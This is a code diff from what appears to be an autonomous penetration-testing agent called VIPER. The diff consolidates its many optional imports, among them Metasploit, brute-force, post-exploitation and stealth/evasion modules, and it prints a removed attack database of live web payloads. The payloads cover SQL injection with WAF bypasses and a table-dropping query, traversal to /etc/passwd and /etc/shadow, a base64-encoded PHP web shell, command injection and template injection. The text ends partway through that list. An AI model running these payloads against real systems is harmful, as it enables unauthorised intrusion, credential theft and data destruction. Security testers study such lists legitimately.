@@ -26,6 +26,9 @@ Run it and walk away. Come back to findings.
 """
 
 import asyncio
+import logging
+
+logger = logging.getLogger("viper.viper_core")
 import aiohttp
 import json
 import os
@@ -58,1275 +61,251 @@ STATE_FILE = CORE_DIR / "viper_state.json"
 KNOWLEDGE_FILE = CORE_DIR / "viper_knowledge.json"
 METRICS_FILE = CORE_DIR / "viper_metrics.json"
 
-# Import new modules
-try:
-    import sys as _sys
-    if str(HACKAGENT_DIR) not in _sys.path:
-        _sys.path.insert(0, str(HACKAGENT_DIR))
-
-    from recon.recon_engine import ReconEngine
-    from recon.surface_mapper import SurfaceMapper
-    from scanners.nuclei_scanner import NucleiScanner
-    from ai.llm_analyzer import LLMAnalyzer
-    from scope.scope_manager import ScopeManager, BugBountyScope, ScopeViolationError
-    MODULES_AVAILABLE = True
-except ImportError as e:
-    MODULES_AVAILABLE = False
-
-# Import VIPER 2.0 upgrade modules
-try:
-    from tools.tool_manager import ToolManager
-    from tools.http_client import HackerHTTPClient, RequestResult
-    from core.viper_db import ViperDB
-    from core.finding_validator import FindingValidator
-    from core.poc_generator import PoCGenerator
-    from core.fuzzer import SmartFuzzer, GrammarFuzzer, PayloadMutator
-    UPGRADE_AVAILABLE = True
-except ImportError as e:
-    UPGRADE_AVAILABLE = False
-
-try:
-    from core.compliance_mapper import enrich_finding as _enrich_compliance
-    from core.compliance_mapper import format_compliance_section
-    COMPLIANCE_AVAILABLE = True
-except ImportError:
-    COMPLIANCE_AVAILABLE = False
-
-try:
-    from core.evograph import EvoGraph
-    EVOGRAPH_AVAILABLE = True
-except ImportError:
-    EVOGRAPH_AVAILABLE = False
-
-try:
-    from core.notifier import Notifier
-    NOTIFIER_AVAILABLE = True
-except ImportError:
-    NOTIFIER_AVAILABLE = False
-
-try:
-    from core.secret_scanner import SecretScanner
-    SECRET_SCANNER_AVAILABLE = True
-except ImportError:
-    SECRET_SCANNER_AVAILABLE = False
-
-try:
-    from core.html_reporter import generate_report as _generate_html_report
-    from core.html_reporter import save_report as _save_html_report
-    HTML_REPORTER_AVAILABLE = True
-except ImportError:
-    HTML_REPORTER_AVAILABLE = False
-
-try:
-    from core.stealth import StealthEngine
-    STEALTH_AVAILABLE = True
-except ImportError:
-    STEALTH_AVAILABLE = False
-
-try:
-    from scanners.gvm_scanner import GVMScanner
-    GVM_AVAILABLE = True
-except ImportError:
-    GVM_AVAILABLE = False
-
-# VIPER 3.0: Phase-aware execution engine
-try:
-    from core.phase_engine import PhaseEngine, Phase
-    PHASE_ENGINE_AVAILABLE = True
-except ImportError:
-    PHASE_ENGINE_AVAILABLE = False
-
-# VIPER 3.0: Attack graph database
-try:
-    from core.attack_graph import AttackGraph
-    ATTACK_GRAPH_AVAILABLE = True
-except ImportError:
-    ATTACK_GRAPH_AVAILABLE = False
-
-# VIPER 3.0: Web crawler + JS analysis
-try:
-    from recon.web_crawler import WebCrawler
-    WEB_CRAWLER_AVAILABLE = True
-except ImportError:
-    WEB_CRAWLER_AVAILABLE = False
-
-# VIPER 3.0: MITRE ATT&CK enrichment
-try:
-    from core.mitre_mapper import enrich_finding_mitre, get_attack_narrative
-    MITRE_AVAILABLE = True
-except ImportError:
-    MITRE_AVAILABLE = False
-
-# VIPER 3.0: LLM guardrails
-try:
-    from core.guardrails import TargetGuardrail, InputSanitizer
-    GUARDRAILS_AVAILABLE = True
-except ImportError:
-    GUARDRAILS_AVAILABLE = False
-
-# VIPER 3.0: Brute force engine
-try:
-    from tools.brute_forcer import BruteForcer
-    BRUTE_FORCER_AVAILABLE = True
-except ImportError:
-    BRUTE_FORCER_AVAILABLE = False
-
-# VIPER 3.0: Metasploit integration
-try:
-    from tools.metasploit import MetasploitClient
-    METASPLOIT_AVAILABLE = True
-except ImportError:
-    METASPLOIT_AVAILABLE = False
-
-# VIPER 3.0: Code remediation agent
-try:
-    from agents.codefix_agent import CodeFixAgent
-    CODEFIX_AVAILABLE = True
-except ImportError:
-    CODEFIX_AVAILABLE = False
-
-# VIPER 3.0: Post-exploitation framework
-try:
-    from agents.post_exploit import PostExploitAgent
-    POST_EXPLOIT_AVAILABLE = True
-except ImportError:
-    POST_EXPLOIT_AVAILABLE = False
-
 # ══════════════════════════════════════════════════════════════════════
-# VIPER 4.0: New module imports
+# Module imports — all optional with graceful degradation
 # ══════════════════════════════════════════════════════════════════════
 
-# Knowledge Graph Engine
-try:
-    from core.graph_engine import GraphEngine
-    from core.chain_writer import ChainWriter
-    from core.graph_query import GraphQueryEngine
-    GRAPH_ENGINE_AVAILABLE = True
-except ImportError:
-    GRAPH_ENGINE_AVAILABLE = False
+import sys as _sys
+if str(HACKAGENT_DIR) not in _sys.path:
+    _sys.path.insert(0, str(HACKAGENT_DIR))
 
-# Agent Orchestrator
-try:
-    from core.orchestrator import ViperOrchestrator
-    from core.agent_state import Phase as OrcPhase
-    from core.think_engine import ThinkEngine
-    ORCHESTRATOR_AVAILABLE = True
-except ImportError:
-    ORCHESTRATOR_AVAILABLE = False
+from core.module_loader import ModuleLoader
 
-# Advanced Guardrails
-try:
-    from core.guardrail_hard import is_blocked as hard_guardrail_check
-    from core.guardrail_llm import check_target_allowed as llm_guardrail_check
-    ADVANCED_GUARDRAILS_AVAILABLE = True
-except ImportError:
-    ADVANCED_GUARDRAILS_AVAILABLE = False
+_ml = ModuleLoader()
 
-# Skill Classification
-try:
-    from core.skill_classifier import classify_attack
-    from core.skill_prompts import get_skill_prompt
-    SKILL_CLASSIFIER_AVAILABLE = True
-except ImportError:
-    SKILL_CLASSIFIER_AVAILABLE = False
+# Core modules
+_ml.register("recon.recon_engine", "ReconEngine", group="modules")
+_ml.register("recon.surface_mapper", "SurfaceMapper", group="modules")
+_ml.register("scanners.nuclei_scanner", "NucleiScanner", group="modules")
+_ml.register("ai.llm_analyzer", "LLMAnalyzer", group="modules")
+_ml.register("scope.scope_manager", "ScopeManager", "BugBountyScope", "ScopeViolationError", group="modules")
 
-# Enhanced Recon
-try:
-    from recon.wappalyzer import Wappalyzer
-    from recon.mitre_enricher import MitreEnricher
-    from recon.shodan_enricher import enrich_ip_sync as shodan_enrich
-    from recon.github_secrets import SecretScanner as GithubSecretScanner
-    ENHANCED_RECON_AVAILABLE = True
-except ImportError:
-    ENHANCED_RECON_AVAILABLE = False
+# Tools & upgrade modules
+_ml.register("tools.tool_manager", "ToolManager", group="upgrade")
+_ml.register("tools.http_client", "HackerHTTPClient", "RequestResult", group="upgrade")
+_ml.register("core.viper_db", "ViperDB", group="upgrade")
+_ml.register("core.finding_validator", "FindingValidator", group="upgrade")
+_ml.register("core.poc_generator", "PoCGenerator", group="upgrade")
+_ml.register("core.fuzzer", "SmartFuzzer", "GrammarFuzzer", "PayloadMutator", group="upgrade")
 
-# CypherFix
-try:
-    from core.triage_engine import TriageEngine
-    from core.triage_queries import run_triage_queries
-    TRIAGE_AVAILABLE = True
-except ImportError:
-    TRIAGE_AVAILABLE = False
+# Compliance & learning
+_ml.register("core.compliance_mapper", "enrich_finding", "format_compliance_section")
+_ml.register("core.evograph", "EvoGraph")
+_ml.register("core.secret_scanner", "SecretScanner")
 
-# Reports
-try:
-    from core.report_narrative import ReportNarrative
-    from core.report_exporter import ReportExporter
-    NARRATIVE_REPORT_AVAILABLE = True
-except ImportError:
-    NARRATIVE_REPORT_AVAILABLE = False
+# Reporting
+_ml.register("core.html_reporter", "generate_report", "save_report")
+_ml.register("core.reporter", "CvssV4Score", "calculate_cvss4")
+_ml.register("core.report_narrative", "ReportNarrative")
+_ml.register("core.report_exporter", "ReportExporter")
+_ml.register("core.finding_stream", "FindingStream", "NotificationConfig")
 
-# MCP Tools
-try:
-    from tools.mcp_tools import MCPToolInterface
-    from tools.msf_persistent import PersistentMsfConsole
-    MCP_TOOLS_AVAILABLE = True
-except ImportError:
-    MCP_TOOLS_AVAILABLE = False
+# Engines
+_ml.register("core.stealth", "StealthEngine", "FingerprintRandomizer")
+_ml.register("core.phase_engine", "PhaseEngine", "Phase")
+_ml.register("core.attack_graph", "AttackGraph")
+_ml.register("core.mitre_mapper", "enrich_finding_mitre", "get_attack_narrative")
+_ml.register("core.guardrails", "TargetGuardrail", "InputSanitizer")
+_ml.register("core.rate_limiter", "HumanTimingProfile")
 
-# Settings
-try:
-    from core.settings_manager import SettingsManager
-    SETTINGS_AVAILABLE = True
-except ImportError:
-    SETTINGS_AVAILABLE = False
+# Scanners & tools
+_ml.register("scanners.gvm_scanner", "GVMScanner")
+_ml.register("recon.web_crawler", "WebCrawler")
+_ml.register("tools.brute_forcer", "BruteForcer")
+_ml.register("tools.metasploit", "MetasploitClient")
 
-# Recon Pipeline
-try:
-    from recon.pipeline import ReconPipeline
-    PIPELINE_AVAILABLE = True
-except ImportError:
-    PIPELINE_AVAILABLE = False
+# Agents
+_ml.register("agents.codefix_agent", "CodeFixAgent")
+_ml.register("agents.post_exploit", "PostExploitAgent")
 
-# Dashboard live events
-try:
-    from dashboard.server import publish_event as _publish_event
-    DASHBOARD_EVENTS = True
-except ImportError:
-    DASHBOARD_EVENTS = False
+# Knowledge graph & orchestrator
+_ml.register("core.graph_engine", "GraphEngine")
+_ml.register("core.chain_writer", "ChainWriter")
+_ml.register("core.graph_query", "GraphQueryEngine")
+_ml.register("core.orchestrator", "ViperOrchestrator")
+_ml.register("core.agent_state", "Phase")  # OrcPhase
+_ml.register("core.think_engine", "ThinkEngine")
 
-    def _publish_event(event_type, data):
-        pass
+# Advanced guardrails & classification
+_ml.register("core.guardrail_hard", "is_blocked")
+_ml.register("core.guardrail_llm", "check_target_allowed")
+_ml.register("core.skill_classifier", "classify_attack")
+_ml.register("core.skill_prompts", "get_skill_prompt")
 
-# ══════════════════════════════════════════════════════════════════════
-# VIPER 5.0: Multi-agent + new attack modules
-# ══════════════════════════════════════════════════════════════════════
+# Enhanced recon
+_ml.register("recon.wappalyzer", "Wappalyzer")
+_ml.register("recon.mitre_enricher", "MitreEnricher")
+_ml.register("recon.shodan_enricher", "enrich_ip_sync")
+_ml.register("recon.github_secrets", "SecretScanner")
 
-# Multi-agent bus
-try:
-    from core.agent_bus import AgentBus, Priority as BusPriority
-    from core.agent_registry import AgentRegistry
-    AGENT_BUS_AVAILABLE = True
-except ImportError:
-    AGENT_BUS_AVAILABLE = False
+# Triage & settings
+_ml.register("core.triage_engine", "TriageEngine")
+_ml.register("core.triage_queries", "run_triage_queries")
+_ml.register("core.settings_manager", "SettingsManager")
+_ml.register("recon.pipeline", "ReconPipeline")
 
-# New attack modules
-try:
-    from core.oauth_fuzzer import OAuthFuzzer
-    OAUTH_FUZZER_AVAILABLE = True
-except ImportError:
-    OAUTH_FUZZER_AVAILABLE = False
+# MCP & tools
+_ml.register("tools.mcp_tools", "MCPToolInterface")
+_ml.register("tools.msf_persistent", "PersistentMsfConsole")
 
-try:
-    from core.websocket_fuzzer import WebSocketFuzzer
-    WS_FUZZER_AVAILABLE = True
-except ImportError:
-    WS_FUZZER_AVAILABLE = False
+# Attack modules (v5.0)
+_ml.register("core.agent_bus", "AgentBus", "Priority")
+_ml.register("core.agent_registry", "AgentRegistry")
+_ml.register("core.oauth_fuzzer", "OAuthFuzzer")
+_ml.register("core.websocket_fuzzer", "WebSocketFuzzer")
+_ml.register("core.race_engine", "RaceEngine")
+_ml.register("core.logic_modeler", "LogicModeler")
+_ml.register("core.failure_analyzer", "FailureAnalyzer")
+_ml.register("core.cross_target_correlator", "CrossTargetCorrelator")
+_ml.register("core.fuzzer", "GeneticFuzzer")
+_ml.register("core.chain_of_custody", "ChainOfCustody")
 
-try:
-    from core.race_engine import RaceEngine
-    RACE_ENGINE_AVAILABLE = True
-except ImportError:
-    RACE_ENGINE_AVAILABLE = False
+# Dashboard events
+_ml.register("dashboard.server", "publish_event")
 
-try:
-    from core.logic_modeler import LogicModeler
-    LOGIC_MODELER_AVAILABLE = True
-except ImportError:
-    LOGIC_MODELER_AVAILABLE = False
+_ml.load_all()
 
-# Self-learning upgrades
-try:
-    from core.failure_analyzer import FailureAnalyzer
-    FAILURE_ANALYZER_AVAILABLE = True
-except ImportError:
-    FAILURE_ANALYZER_AVAILABLE = False
+# ── Backward-compatible availability flags ──
+# These preserve the existing API so ViperCore.__init__ doesn't need rewriting yet.
+MODULES_AVAILABLE = _ml.available("ReconEngine") and _ml.available("SurfaceMapper")
+UPGRADE_AVAILABLE = _ml.available("ViperDB") and _ml.available("FindingValidator")
+COMPLIANCE_AVAILABLE = _ml.available("enrich_finding")
+EVOGRAPH_AVAILABLE = _ml.available("EvoGraph")
+NOTIFIER_AVAILABLE = False  # Consolidated into FindingStream
+SECRET_SCANNER_AVAILABLE = _ml.available("SecretScanner")
+HTML_REPORTER_AVAILABLE = _ml.available("generate_report")
+STEALTH_AVAILABLE = _ml.available("StealthEngine")
+GVM_AVAILABLE = _ml.available("GVMScanner")
+PHASE_ENGINE_AVAILABLE = _ml.available("PhaseEngine")
+ATTACK_GRAPH_AVAILABLE = _ml.available("AttackGraph")
+WEB_CRAWLER_AVAILABLE = _ml.available("WebCrawler")
+MITRE_AVAILABLE = _ml.available("enrich_finding_mitre")
+GUARDRAILS_AVAILABLE = _ml.available("TargetGuardrail")
+BRUTE_FORCER_AVAILABLE = _ml.available("BruteForcer")
+METASPLOIT_AVAILABLE = _ml.available("MetasploitClient")
+CODEFIX_AVAILABLE = _ml.available("CodeFixAgent")
+POST_EXPLOIT_AVAILABLE = _ml.available("PostExploitAgent")
+GRAPH_ENGINE_AVAILABLE = _ml.available("GraphEngine")
+ORCHESTRATOR_AVAILABLE = _ml.available("ViperOrchestrator")
+ADVANCED_GUARDRAILS_AVAILABLE = _ml.available("is_blocked")
+SKILL_CLASSIFIER_AVAILABLE = _ml.available("classify_attack")
+ENHANCED_RECON_AVAILABLE = _ml.available("Wappalyzer")
+TRIAGE_AVAILABLE = _ml.available("TriageEngine")
+NARRATIVE_REPORT_AVAILABLE = _ml.available("ReportNarrative")
+MCP_TOOLS_AVAILABLE = _ml.available("MCPToolInterface")
+SETTINGS_AVAILABLE = _ml.available("SettingsManager")
+PIPELINE_AVAILABLE = _ml.available("ReconPipeline")
+DASHBOARD_EVENTS = _ml.available("publish_event")
+AGENT_BUS_AVAILABLE = _ml.available("AgentBus")
+OAUTH_FUZZER_AVAILABLE = _ml.available("OAuthFuzzer")
+WS_FUZZER_AVAILABLE = _ml.available("WebSocketFuzzer")
+RACE_ENGINE_AVAILABLE = _ml.available("RaceEngine")
+LOGIC_MODELER_AVAILABLE = _ml.available("LogicModeler")
+FAILURE_ANALYZER_AVAILABLE = _ml.available("FailureAnalyzer")
+CROSS_CORRELATOR_AVAILABLE = _ml.available("CrossTargetCorrelator")
+GENETIC_FUZZER_AVAILABLE = _ml.available("GeneticFuzzer")
+FINGERPRINT_RANDOMIZER_AVAILABLE = _ml.available("FingerprintRandomizer")
+HUMAN_TIMING_AVAILABLE = _ml.available("HumanTimingProfile")
+CHAIN_OF_CUSTODY_AVAILABLE = _ml.available("ChainOfCustody")
+CVSS4_AVAILABLE = _ml.available("CvssV4Score")
+FINDING_STREAM_AVAILABLE = _ml.available("FindingStream")
 
-try:
-    from core.cross_target_correlator import CrossTargetCorrelator
-    CROSS_CORRELATOR_AVAILABLE = True
-except ImportError:
-    CROSS_CORRELATOR_AVAILABLE = False
+# ── Convenience accessors for loaded modules ──
+# These replace the direct imports (e.g., `ReconEngine` → `_ml.get("ReconEngine")`)
+# Used by ViperCore.__init__ which checks *_AVAILABLE flags first.
 
-try:
-    from core.fuzzer import GeneticFuzzer
-    GENETIC_FUZZER_AVAILABLE = True
-except ImportError:
-    GENETIC_FUZZER_AVAILABLE = False
+def _get(name):
+    """Get a loaded module object by name."""
+    return _ml.get(name)
 
-# Stealth & OPSEC upgrades
-try:
-    from core.stealth import FingerprintRandomizer
-    FINGERPRINT_RANDOMIZER_AVAILABLE = True
-except ImportError:
-    FINGERPRINT_RANDOMIZER_AVAILABLE = False
-
-try:
-    from core.rate_limiter import HumanTimingProfile
-    HUMAN_TIMING_AVAILABLE = True
-except ImportError:
-    HUMAN_TIMING_AVAILABLE = False
-
-try:
-    from core.chain_of_custody import ChainOfCustody
-    CHAIN_OF_CUSTODY_AVAILABLE = True
-except ImportError:
-    CHAIN_OF_CUSTODY_AVAILABLE = False
-
-# Reporting upgrades
-try:
-    from core.reporter import CvssV4Score, calculate_cvss4
-    CVSS4_AVAILABLE = True
-except ImportError:
-    CVSS4_AVAILABLE = False
-
-try:
-    from core.finding_stream import FindingStream, NotificationConfig
-    FINDING_STREAM_AVAILABLE = True
-except ImportError:
-    FINDING_STREAM_AVAILABLE = False
-
+def _publish_event(event_type, data):
+    """Safely emit a dashboard event."""
+    fn = _ml.get("publish_event")
+    if fn:
+        try:
+            fn(event_type, data)
+        except Exception:
+            pass
 
 def _emit(event_type, **data):
     """Safely emit a dashboard event (no-op if dashboard unavailable)."""
-    try:
-        _publish_event(event_type, data)
-    except Exception:
-        pass
+    _publish_event(event_type, data)
 
 
-@dataclass
-class Attack:
-    """An attack with all its variants"""
-    name: str
-    category: str  # recon, injection, auth, file, misc
-    payloads: List[str]
-    indicators: List[str]  # When to try this attack
-    success_markers: List[str]  # How to know it worked
-    failure_markers: List[str]  # How to know it definitely failed
-    followups: List[str]  # What to try next if this works
-    
-    # Learning stats
-    attempts: int = 0
-    successes: int = 0
-    
-    @property
-    def success_rate(self) -> float:
-        return self.successes / max(self.attempts, 1)
-    
-    @property
-    def confidence(self) -> float:
-        if self.attempts < 5:
-            return 0.5
-        return self.success_rate
+from core.viper_knowledge import Attack, ViperKnowledge
+from core.models import Target
 
-
-@dataclass 
-class Target:
-    """A target being hunted"""
-    url: str
-    discovered: datetime = field(default_factory=datetime.now)
-    
-    # What we know
-    technologies: Set[str] = field(default_factory=set)
-    endpoints: Set[str] = field(default_factory=set)
-    parameters: Set[str] = field(default_factory=set)
-    vulns_found: List[Dict] = field(default_factory=list)
-    
-    # Recon data
-    subdomains: Set[str] = field(default_factory=set)
-    open_ports: Dict[str, List[int]] = field(default_factory=dict)
-    js_endpoints: Set[str] = field(default_factory=set)
-    api_endpoints: Set[str] = field(default_factory=set)
-    
-    # Hunt state
-    attacks_tried: Dict[str, int] = field(default_factory=dict)
-    last_progress: datetime = field(default_factory=datetime.now)
-    access_level: int = 0  # 0=none, 1=info, 2=read, 3=write, 4=shell, 5=root
-    
-    # Scan results
-    nuclei_findings: List[Dict] = field(default_factory=list)
-    
-    # Metrics
-    total_requests: int = 0
-    successful_requests: int = 0
-    
-    def should_try_attack(self, attack_name: str, max_attempts: int = 3) -> bool:
-        return self.attacks_tried.get(attack_name, 0) < max_attempts
-    
-    def record_attack(self, attack_name: str, success: bool):
-        self.attacks_tried[attack_name] = self.attacks_tried.get(attack_name, 0) + 1
-        if success:
-            self.last_progress = datetime.now()
-    
-    def is_stale(self, minutes: int = 10) -> bool:
-        return datetime.now() - self.last_progress > timedelta(minutes=minutes)
-    
-    def get_untried_attacks(self, all_attacks: List[str]) -> List[str]:
-        return [a for a in all_attacks if a not in self.attacks_tried]
-
-
-class ViperKnowledge:
-    """VIPER's learned knowledge base."""
-    
-    def __init__(self):
-        self.attacks: Dict[str, Attack] = {}
-        self.tech_signatures: Dict[str, List[str]] = {}
-        self.successful_chains: List[List[str]] = []
-        self.target_history: Dict[str, Dict] = {}
-        
-        self._init_attacks()
-        self._load()
-    
-    def _init_attacks(self):
-        """Initialize attack database"""
-        attacks_data = [
-            # === RECON ===
-            Attack(
-                name="robots_txt",
-                category="recon",
-                payloads=["/robots.txt"],
-                indicators=["http", "://"],
-                success_markers=["Disallow:", "Allow:", "User-agent"],
-                failure_markers=["404", "Not Found"],
-                followups=["dir_bruteforce"]
-            ),
-            Attack(
-                name="git_exposure",
-                category="recon",
-                payloads=["/.git/HEAD", "/.git/config"],
-                indicators=["http"],
-                success_markers=["ref:", "[core]", "[remote"],
-                failure_markers=["404", "Not Found"],
-                followups=["git_dump"]
-            ),
-            Attack(
-                name="env_file",
-                category="recon",
-                payloads=["/.env", "/.env.local", "/.env.production"],
-                indicators=["http"],
-                success_markers=["DB_", "API_KEY", "SECRET", "PASSWORD", "TOKEN"],
-                failure_markers=["404", "<!DOCTYPE"],
-                followups=["credential_use"]
-            ),
-            Attack(
-                name="backup_files",
-                category="recon",
-                payloads=["/index.php.bak", "/index.php~", "/index.php.old", "/.index.php.swp"],
-                indicators=["php"],
-                success_markers=["<?php", "<?="],
-                failure_markers=["404"],
-                followups=["source_analysis"]
-            ),
-            Attack(
-                name="dir_listing",
-                category="recon",
-                payloads=["/uploads/", "/backup/", "/admin/", "/files/", "/images/"],
-                indicators=["http"],
-                success_markers=["Index of", "Parent Directory", "<dir>"],
-                failure_markers=["403", "404", "Forbidden"],
-                followups=["file_enum"]
-            ),
-            
-            # === INJECTION ===
-            Attack(
-                name="sqli_error",
-                category="injection",
-                payloads=[
-                    # Classic error-based
-                    "'", "\"", "')", "\"))", "''", "' OR '1'='1",
-                    "\" OR \"1\"=\"1", "1' AND '1'='1", "1 AND 1=1",
-                    "' OR 1=1--", "' OR 'x'='x", "') OR ('1'='1",
-                    "1' ORDER BY 1--", "1' ORDER BY 10--", "1' ORDER BY 100--",
-                    # Boolean blind
-                    "' AND 1=1--", "' AND 1=2--", "' OR 1=1#", "admin'--",
-                    "' AND 'a'='a", "' AND 'a'='b",
-                    # Time-based blind
-                    "' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--",
-                    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
-                    "' OR SLEEP(5)#", "'; SELECT pg_sleep(5)--",
-                    "1; WAITFOR DELAY '0:0:5'--",
-                    # Stacked queries
-                    "'; DROP TABLE test--", "'; SELECT 1--",
-                    # WAF bypass
-                    "/*!50000UNION*/", "%27", "%2527", "' AnD 1=1--",
-                    "' /*!50000OR*/ '1'='1", "' uni%6fn sel%65ct 1--",
-                    "' %55NION %53ELECT 1--", "' AND/**/1=1--",
-                    # Database-specific
-                    "' AND @@version--", "' AND version()--",
-                    "' AND sqlite_version()--", "' AND banner FROM v$version--",
-                    # Numeric injection
-                    "1 OR 1=1", "1) OR (1=1", "-1 OR 1=1",
-                    "1; SELECT 1", "1 HAVING 1=1",
-                ],
-                indicators=["=", "id", "user", "name", "search", "query", "select", "item", "cat", "page", "view"],
-                success_markers=[
-                    r"SQL[\s\S]{0,40}syntax", r"mysql[\s_]", r"ORA-\d{4,5}",
-                    r"PostgreSQL.*ERROR", r"sqlite3?\.", r"ODBC.*Driver",
-                    r"Microsoft.*SQL.*Server", r"Unclosed quotation mark",
-                    r"pg_query\(\)", r"supplied argument is not a valid MySQL",
-                    r"You have an error in your SQL", r"Warning.*mysql_",
-                    r"MySqlClient\.", r"com\.mysql\.jdbc",
-                    r"org\.postgresql\.util\.PSQLException",
-                    r"Dynamic SQL Error", r"Sybase message",
-                    r"valid MySQL result", r"Syntax error.*in query expression",
-                ],
-                failure_markers=[],
-                followups=["sqli_union", "sqli_blind"]
-            ),
-            Attack(
-                name="sqli_union",
-                category="injection",
-                payloads=[
-                    "' UNION SELECT NULL--",
-                    "' UNION SELECT NULL,NULL--",
-                    "' UNION SELECT NULL,NULL,NULL--",
-                    "' UNION SELECT NULL,NULL,NULL,NULL--",
-                    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
-                    "' UNION SELECT 1,2,3--",
-                    "' UNION SELECT 1,2,3,4,5--",
-                    "' UNION ALL SELECT NULL,NULL,@@version--",
-                    "' UNION ALL SELECT NULL,NULL,version()--",
-                    "' UNION SELECT username,password FROM users--",
-                    "1 UNION SELECT username,password FROM users--",
-                    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
-                    "' UNION SELECT column_name,NULL FROM information_schema.columns--",
-                    "' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables--",
-                    "' UNION SELECT NULL,NULL,NULL FROM dual--",
-                    "') UNION SELECT NULL,NULL--",
-                    "')) UNION SELECT NULL,NULL--",
-                    "' UNION SELECT 1,CONCAT(user(),database())--",
-                    # WAF bypass union
-                    "' /*!50000UNION*/ /*!50000SELECT*/ NULL--",
-                    "' %55nion %53elect NULL--",
-                    "' uNiOn sElEcT NULL--",
-                    "' UNION ALL SELECT NULL-- -",
-                ],
-                indicators=["sqli_error"],
-                success_markers=[
-                    r"admin", r"password", r"username",
-                    r"root@", r"information_schema",
-                    r"\d+\.\d+\.\d+", r"@@version",
-                ],
-                failure_markers=["blocked", "WAF", "forbidden"],
-                followups=["sqli_dump"]
-            ),
-            Attack(
-                name="sqli_blind",
-                category="injection",
-                payloads=[
-                    "' AND SUBSTRING(version(),1,1)='5'--",
-                    "' AND (SELECT COUNT(*) FROM users)>0--",
-                    "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
-                    "' AND (SELECT LENGTH(database()))>0--",
-                    "' AND 1=(SELECT 1 FROM information_schema.tables LIMIT 1)--",
-                    "' OR (SELECT COUNT(*) FROM information_schema.tables)>0--",
-                    "1 AND 1=1", "1 AND 1=2",
-                ],
-                indicators=["sqli_error"],
-                success_markers=[r"different.*response", r"true.*condition"],
-                failure_markers=["blocked", "WAF"],
-                followups=["sqli_dump"]
-            ),
-            Attack(
-                name="lfi_basic",
-                category="injection",
-                payloads=[
-                    "/etc/passwd", "../etc/passwd",
-                    "../../etc/passwd", "../../../etc/passwd",
-                    "../../../../etc/passwd", "../../../../../etc/passwd",
-                    "....//....//....//etc/passwd",
-                    "..\\..\\..\\..\\etc\\passwd",
-                    "/etc/passwd%00", "....//....//etc/passwd%00",
-                    "..\\..\\..\\windows\\win.ini%00",
-                    "%252e%252e%252fetc/passwd",
-                    "..%252f..%252f..%252fetc/passwd",
-                    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-                    "..%c0%af..%c0%afetc/passwd",
-                    "..%ef%bc%8f..%ef%bc%8fetc/passwd",
-                    "/var/log/apache2/access.log", "/var/log/apache2/error.log",
-                    "/var/log/nginx/access.log", "/var/log/nginx/error.log",
-                    "/var/log/httpd/access_log", "/var/log/auth.log",
-                    "/proc/self/environ", "/proc/self/fd/0", "/proc/self/cmdline",
-                    "C:\\Windows\\System32\\drivers\\etc\\hosts",
-                    "C:\\Windows\\win.ini", "C:\\boot.ini",
-                    "....\\\\....\\\\windows\\win.ini",
-                    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
-                    "/etc/shadow", "/etc/hosts", "/etc/hostname",
-                    "/etc/apache2/apache2.conf", "/etc/nginx/nginx.conf",
-                    "/etc/mysql/my.cnf", "../../../../../../etc/passwd",
-                ],
-                indicators=["file", "path", "page", "include", "doc", "template", "load", "lang", "dir", "view"],
-                success_markers=[
-                    r"root:x?:\d+:\d+", r"/bin/(?:ba)?sh", r"\[extensions\]",
-                    r"\[fonts\]", r"root:.*:0:0", r"daemon:.*:",
-                    r"\[boot loader\]", r"DocumentRoot", r"server_name",
-                ],
-                failure_markers=["No such file", "failed to open", "not found"],
-                followups=["lfi_wrapper", "log_poison"]
-            ),
-            Attack(
-                name="lfi_wrapper",
-                category="injection",
-                payloads=[
-                    "php://filter/convert.base64-encode/resource=index",
-                    "php://filter/convert.base64-encode/resource=index.php",
-                    "php://filter/convert.base64-encode/resource=/etc/passwd",
-                    "php://filter/convert.base64-encode/resource=config",
-                    "php://filter/convert.base64-encode/resource=../config",
-                    "php://filter/read=string.rot13/resource=index.php",
-                    "php://filter/convert.iconv.utf-8.utf-16/resource=index.php",
-                    "php://input",
-                    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",
-                    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
-                    "expect://id",
-                    "expect://whoami",
-                    "phar://test.phar",
-                    "zip://uploads/avatar.zip#shell.php",
-                ],
-                indicators=["php", "lfi_basic"],
-                success_markers=[r"PD9", r"cm9vd", r"base64", r"<\?php", r"phpinfo"],
-                failure_markers=["allow_url_include", "not supported"],
-                followups=["rce"]
-            ),
-            Attack(
-                name="cmdi_basic",
-                category="injection",
-                payloads=[
-                    ";id", "|id", "||id", "&&id", "`id`", "$(id)",
-                    "& id", "\nid", ";ls", "|ls",
-                    "; sleep 5", "| sleep 5", "& sleep 5",
-                    "|| sleep 5", "&& sleep 5",
-                    "& ping -c 5 127.0.0.1 &",
-                    "; ping -c 5 127.0.0.1",
-                    "| ping -c 5 127.0.0.1",
-                    "& whoami", "| dir", "& dir",
-                    "& ping -n 5 127.0.0.1", "| type C:\\windows\\win.ini",
-                    "& net user", "| systeminfo",
-                    "${IFS}id", "i\\d", ";{id}",
-                    "$IFS/etc/passwd", ";cat${IFS}/etc/passwd",
-                    "%0aid", "%0a%0did",
-                    "$(whoami)", "`whoami`", "$({cat,/etc/passwd})",
-                    "$(cat</etc/passwd)",
-                    "%0a id", "%0d%0a id", "%09id",
-                ],
-                indicators=["cmd", "exec", "ping", "host", "ip", "system", "run", "command", "shell"],
-                success_markers=[
-                    r"uid=\d+", r"gid=\d+", r"groups=",
-                    r"root:x:", r"www-data",
-                    r"Directory of", r"Volume Serial",
-                    r"\w+\\\w+", r"NT AUTHORITY",
-                    r"total \d+", r"drwx",
-                ],
-                failure_markers=["not found", "invalid command"],
-                followups=["reverse_shell"]
-            ),
-            Attack(
-                name="ssti_basic",
-                category="injection",
-                payloads=[
-                    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "{7*7}", "#{7*7}",
-                    "{{7*\'7\'}}", "${{7*7}}",
-                    "{{config}}", "{{config.items()}}",
-                    "{{self.__init__.__globals__}}",
-                    "{{''.__class__.__mro__[1].__subclasses__()}}",
-                    "{{request.application.__globals__.__builtins__}}",
